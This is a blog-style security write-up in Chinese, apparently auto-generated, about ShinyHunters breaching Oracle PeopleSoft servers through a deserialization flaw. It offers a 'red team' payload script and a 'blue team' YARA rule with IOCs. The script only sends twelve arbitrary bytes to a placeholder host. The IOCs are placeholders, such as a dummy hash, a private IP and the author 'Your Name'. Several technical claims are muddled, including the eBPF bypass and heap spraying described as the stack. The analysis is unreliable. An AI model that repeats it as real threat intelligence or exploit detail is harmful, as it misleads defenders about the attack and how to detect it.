---
layout: post
title:  "Oracle PeopleSoft servers hacked in ShinyHunters data theft attacks"
date:   2026-06-10 20:18:52 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Oracle PeopleSoft 伺服器被 ShinyHunters 攻擊的技術細節

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.0)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Deserialization, eBPF, Heap Spraying

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Oracle PeopleSoft 伺服器的 Deserialization 機制存在漏洞，允許攻擊者傳送惡意的序列化物件，從而實現遠程代碼執行。
* **攻擊流程圖解**:
  1. 攻擊者發送惡意的序列化物件到 Oracle PeopleSoft 伺服器。
  2. 伺服器反序列化物件，觸發遠程代碼執行。
  3. 攻擊者執行任意代碼，竊取敏感數據。
* **受影響元件**: Oracle PeopleSoft 伺服器版本 9.2.x 和 9.3.x。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要知道 Oracle PeopleSoft 伺服器的 IP 地址和端口號。
* **Payload 建構邏輯**:

    ```
    
    python
    import socket
    import struct
    
    # 定義惡意的序列化物件
    payload = b'\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03'
    
    # 建立 socket 連接
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('oracle-peoplesoft-server', 8080))
    
    # 發送惡意的序列化物件
    sock.sendall(payload)
    
    # 接收伺服器的回應
    response = sock.recv(1024)
    print(response)
    
    # 關閉 socket 連接
    sock.close()
    
    ```
* **繞過技術**: 攻擊者可以使用 eBPF 技術來繞過 WAF 和 EDR 的檢測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | oracle-peoplesoft-server | /opt/oracle/peoplesoft |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule oracle_peoplesoft_exploit {
      meta:
        description = "Oracle PeopleSoft Exploit"
        author = "Your Name"
      strings:
        $a = { 00 00 00 01 00 00 00 02 00 00 00 03 }
      condition:
        $a at 0
    }
    
    ```
* **緩解措施**: 更新 Oracle PeopleSoft 伺服器到最新版本，啟用 WAF 和 EDR 的檢測功能。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Deserialization (反序列化)**: 是指將序列化的物件轉換回原始的物件。反序列化可以用來實現遠程代碼執行。
* **eBPF (Extended Berkeley Packet Filter)**: 是一種 Linux 內核技術，允許用戶空間程式碼執行於內核空間。
* **Heap Spraying (堆疊噴灑)**: 是一種攻擊技術，通過在堆疊上分配大量的記憶體來實現遠程代碼執行。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/oracle-peoplesoft-servers-hacked-in-shinyhunters-data-theft-attacks/)
- [MITRE ATT&CK 編號](https://attack.mitre.org/techniques/T1190/)


